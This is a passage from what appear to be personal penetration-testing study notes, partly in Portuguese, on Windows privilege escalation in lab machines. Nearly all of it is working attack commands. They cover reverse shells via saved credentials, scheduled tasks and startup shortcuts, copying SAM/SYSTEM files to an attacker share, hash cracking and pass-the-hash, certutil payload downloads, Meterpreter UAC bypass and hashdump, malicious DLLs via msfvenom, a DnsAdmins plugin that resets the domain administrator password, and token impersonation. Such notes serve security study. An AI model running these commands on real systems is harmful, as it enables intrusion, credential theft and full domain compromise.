        `cmdkey /list`
        
        Note that credentials for the "admin" user are saved. If they aren't, run the C:\PrivEsc\savecred.bat script to refresh the saved credentials.
        
        Start a listener on Kali and run the reverse.exe executable using runas with the admin user's saved credentials:
        
        `runas /savecred /user:admin C:\PrivEsc\reverse.exe`
        
    - Security Account Manager
        
        The SAM and SYSTEM files can be used to extract user password hashes. This VM has insecurely stored backups of the SAM and SYSTEM files in the C:\Windows\Repair\ directory.
        
        Transfer the SAM and SYSTEM files to your Kali VM:
        
        `copy C:\Windows\Repair\SAM \\10.10.10.10\kali\copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\`
        
        On Kali, clone the creddump7 repository (the one on Kali is outdated and will not dump hashes correctly for Windows 10!) and use it to dump out the hashes from the SAM and SYSTEM files:
        
        `git clone https://github.com/Tib3rius/creddump7pip3 install pycryptopython3 creddump7/pwdump.py SYSTEM SAM`
        
        Crack the admin NTLM hash using hashcat:
        
        `hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt`
        
        You can use the cracked password to log in as the admin using winexe or RDP.
        
    - Passing the Hash
        
        Why crack a password hash when you can authenticate using the hash?
        
        Use the full admin hash with pth-winexe to spawn a shell running as admin without needing to crack their password. Remember the full hash includes both the LM and NTLM hash, separated by a colon:
        
        `pth-winexe -U 'admin%hash' //MACHINE_IP cmd.exe`
        
    

# Schedule Tasks

- Schedule Tasks
    
    View the contents of the C:\DevTools\CleanUp.ps1 script:
    
    `type C:\DevTools\CleanUp.ps1`
    
    The script seems to be running as SYSTEM every minute. Using accesschk.exe, note that you have the ability to write to this file:
    
    `C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1`
    
    Start a listener on Kali and then append a line to the C:\DevTools\CleanUp.ps1 which runs the reverse.exe executable you created:
    
    `echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1`
    
    Wait for the Scheduled Task to run, which should trigger the reverse shell as SYSTEM.
    

# Insecure GUI Apps

- Insecure GUI Apps
    
    Start an RDP session as the "user" account:
    
    `rdesktop -u user -p password321 MACHINE_IP`
    
    Double-click the "AdminPaint" shortcut on your Desktop. Once it is running, open a command prompt and note that Paint is running with admin privileges:
    
    `tasklist /V | findstr mspaint.exe`
    
    In Paint, click "File" and then "Open". In the open file dialog box, click in the navigation input and paste: file://c:/windows/system32/cmd.exe
    
    Press Enter to spawn a command prompt running with admin privileges.
    

# Startups apps

- Startups apps
    
    Using accesschk.exe, note that the BUILTIN\Users group can write files to the StartUp directory:
    
    `C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"`
    
    Using cscript, run the C:\PrivEsc\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory:
    
    `cscript C:\PrivEsc\CreateShortcut.vbs`
    
    Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted:
    
    `rdesktop -u admin MACHINE_IP`
    
    A shell running as admin should connect back to your listener.
    

# Secundary Logon

- Secondary Logon
    
    **Requerimentos**
    
    - The target system should have two or more CPU cores.
    - The target system should be running PowerShell V2.0 or later.
    
    **Automated**
    
    `use exploit/windows/local/ms16_032_secondary_logon_handle_privesc`
    
    **Manual**
    
    `certutil -urlcache -f http://<KALI-VM-IP>/ms16-032.exe ms16-032.exe`
    
    [](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032)
    

# UAC

- UAC
    - UAC Bypass: Memory Injection
        
        ```powershell
        nmap 10.0.23.239
        nmap -sV -p 80 10.0.23.239
        searchsploit hfs
        
        Metasploit
        msfconsole -q
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS 10.0.23.239
        exploit
        
        Meterpreter
        getuid
        sysinfo
        ps -S explorer.exe
        migrate 2440
        getsystem
        shell
        net localgroup administrators
        
        use exploit/windows/local/bypassuac_injection
        set session 1
        set TARGET 1
        set PAYLOAD windows/x64/meterpreter/reverse_tcp
        exploit
        
        getsystem
        getuid
        
        shell 
        net users
        net localgroup administrators
        
        ps -S lsass.exe
        migrate 688
        
        hashdump
        ```
        
    - UAC
        
        ```powershell
        Meterpreter
        ps -S explorer.exe
        migrate 2444
        getuid
        sysinfo
        getsystem
        shell
        net localgroup administrators
        CTRL + C
        cd C:\\Users\\admin\\AppData\\Local\\Temp
        upload /root/Desktop/tools/UACME/Akagi64.exe .
        upload /root/backdoor.exe .
        ls
        hashdump
        ```
        

# Weak Service Permissions

- Weak Service Permissions
    
    [AccessChk - Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
    
    `upload /<PATH-TO-EXECUTABLE/accesschk64.exe`
    
    `.\accesschk64.exe -uwcqv "user" * -accepteula`
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2017.png)
    
    `sc qc OpenSSHd`
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2018.png)
    
    `sc config "OpenSSHd" binPath= "net localgroup administrators user /add"`
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2019.png)
    
    `sc stop OpenSSHd`
    
    `sc start OpenSSHd`
    
    `net localgroup administrators`
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2020.png)
    
    `use exploit/windows/local/service_permissions`
    

# DLL Hijacking

- DLL Hijacking
    - Setting up our environment
        
        The first step in the process will involve downloading and running a Windows
        batch script on the Windows 7 virtual machine.
        
        [](https://raw.githubusercontent.com/sagishahar/)
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2021.png)
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2022.png)
        
        After restarting the system, we will need to start the vulnerable DLL service. This
        can be done by running the following command in the Windows command prompt
        on the target virtual machine:
        `sc start dllsvc`
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2023.png)
        
    - DLL exploitation process
        
        `.\winPEASx64.exe servicesinfo`
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2024.png)
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2025.png)
        
        [Process Monitor - Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2026.png)
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2027.png)
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2028.png)
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2029.png)
        
        `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=PORT -f dll > hijackme.dll`
        
        After generating the custom DLL, we can transfer it to the target system under the
        respective service path. In our case, the path will be the following:
        `C:\Windows\System32\wbem`
        We can upload the custom DLL with Meterpreter by running the following command:
        `upload /PATH-TO-DLL/hijackme.dll`
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2030.png)
        
        Set up the listener
        
        `sc stop dllsvc
         sc start dllsvc`
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2031.png)
        
    
- DLL Dns
    
    Ao enumerar o utilizador encontramos `MEGABANK\DnsAdmins`
    
    ```
    Evil-WinRM* PS C:\Users\ryan\Documents> whoami /all
    
    USER INFORMATION
    ----------------
    
    User Name     SID
    ============= ==============================================
    megabank\ryan S-1-5-21-1392959593-3013219662-3596683436-1105
    
    GROUP INFORMATION
    -----------------
    
    Group Name                                 Type             SID                                            Attributes
    ========================================== ================ ============================================== ===============================================================
    Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
    BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
    BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
    BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
    MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
    MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
    NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
    Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
    ```
    
    Primeiro criamos a DLL com o msfvenom
    
    `msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -
    f dll > da.dll`
    
    Se colocar-mos a dll no windows muito provavelmente que o Windows Defender iria eliminar 
    
    `sudo smbserver.py share ./`
    
    Correr o comando 
    
    `cmd /c dnscmd localhost /config /serverlevelplugindll \\10.10.14.9\share\da.dll`
    
    Depois parar o serviço dns 
    
    `sc.exe stop dns`
    `sc.exe start dns`
    
    Na maquina linux 
    
    `sudo psexec.py megabank.local/administrator@10.10.10.169`
    

# Impersonation

- Impersonation Attacks
    
    The following are the `privileges` that are `required` for a `successful impersonation attack`:
    `SeAssignPrimaryToken` This allows a user to impersonate tokens using exploit
    tools such as rottenpotato.exe.
    `SeCreateToken` This allows a user to create an arbitrary token with
    administrative privileges.
    `SeImpersonatePrivilege`: This allows a user to create a process under the
    security context of another user typically with administrative privileges.
    
    `Whoami /priv`
    
    ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2032.png)
    
    - Token Impersonation
        
        Token impersonation attacks leverage specific `Windows privileges` such as
        `SeImpersonatePrivilege` to obtain an access token with administrative privileges
        that we can use to impersonate in order to elevate our privileges.
        
        ```powershell
        Meterpreter
        getuid
        load incognito
        list_tokens -u
        impersonate_token ATTACKDEFENSE\\Administrator 
        getuid
        cat C:\\Users\\Administrator\\Desktop\\flag.txt
        ```
        
    - Rotten Potato
        
        **Automated**
        
        `./windows-exploit-suggester.py --database <Database>.xlsx --systeminfo <Systeminfo>.txt`
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2033.png)
        
        `use exploit/windows/local/ms16_075_reflection`
        
        `load incognito`
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2034.png)
        
        `list_tokens -u`
        
        As `highlighted` in the following screenshot, this will list all available user tokens that
        we can impersonate to elevate our privileges. In this case, we are able to identify the
        `NT AUTHORITY/SYSTEM` access token with the delegate security level:
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2035.png)
        
        `impersonate_token "NT AUTHORITY\SYSTEM”`
        
        ![Untitled](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Untitled%2036.png)
        
        **Manual**
        
        `./windows-exploit-suggester.py --database <Database>.xlsx --systeminfo <Systeminfo>.txt`
        
        `certutil -urlcache -f http://<KALI-VM-IP>/rottenpotato.exe rottenpotato.exe`
        
        `load incognito`
        
        `shell`
        
        `.\rottenpotato.exe`
        
        `list_tokens -u`
        
        `impersonate_token "NT AUTHORITY\SYSTEM”`
        

# Passwords Mining

[Windows Password Mining](Privelige%20excalation%20959f3e5c95f04c0cb21f30f9a00bb8c7/Windows%20Password%20Mining%20e0240b3dbc734da9bf341cbf28c9c87b.md)